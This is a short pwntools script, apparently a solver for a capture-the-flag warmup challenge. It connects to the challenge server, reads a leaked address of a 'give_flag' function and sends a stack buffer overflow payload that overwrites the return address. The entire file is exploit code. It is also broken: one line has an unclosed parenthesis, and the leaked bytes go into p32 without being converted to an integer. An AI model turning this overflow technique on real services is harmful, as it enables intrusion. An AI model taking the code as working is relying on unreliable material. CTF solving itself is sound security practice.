from pwn import *

target = remote('pwn-warmup.chal.uiuc.tf', 1337 )

# Receive flag location

#location = target.recvuntil("go")
#leak = target.recvline()
#rint(leak)
#inputAdr = leak[12:len(leak)]

leak = target.recvline_startswith("&give_flag")
print(leak)

inputAdr = (leak[12:len(leak)]


payload = b'\x00'*0x14 + p32(inputAdr)

target.send(payload)

#flag = target.recvline()

#print(flag)
